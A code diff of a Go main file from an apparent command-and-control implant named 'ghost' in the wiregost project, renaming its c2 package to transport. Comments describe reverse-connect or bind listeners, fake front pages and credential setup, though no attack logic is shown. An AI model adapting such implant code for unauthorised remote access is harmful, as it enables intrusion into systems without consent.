@@ -2,14 +2,14 @@ package main
 
 import (
 	"github.com/maxlandon/wiregost/ghost/assets"
-	"github.com/maxlandon/wiregost/ghost/c2"
-	"github.com/maxlandon/wiregost/ghost/c2/route"
 	"github.com/maxlandon/wiregost/ghost/channels"
 	"github.com/maxlandon/wiregost/ghost/info"
 	"github.com/maxlandon/wiregost/ghost/log"
 	"github.com/maxlandon/wiregost/ghost/profile"
 	"github.com/maxlandon/wiregost/ghost/rpc"
 	"github.com/maxlandon/wiregost/ghost/security"
+	"github.com/maxlandon/wiregost/ghost/transport"
+	"github.com/maxlandon/wiregost/ghost/transport/route"
 )
 
 func main() {
@@ -37,10 +37,10 @@ func main() {
 	// Set network security & credentials
 	// Authorisations to connect to listener, fake front pages/redirections
 	// credentials, certificates, etc...
-	c2.SetupSecurity()
+	transport.SetupSecurity()
 
 	// Reverse connect or bind listener (goroutine, + send information)
-	c2.InitGhostComms()
+	transport.InitGhostComms()
 
 	// Register RPC services if listener
 	rpc.InitGhostRPC()
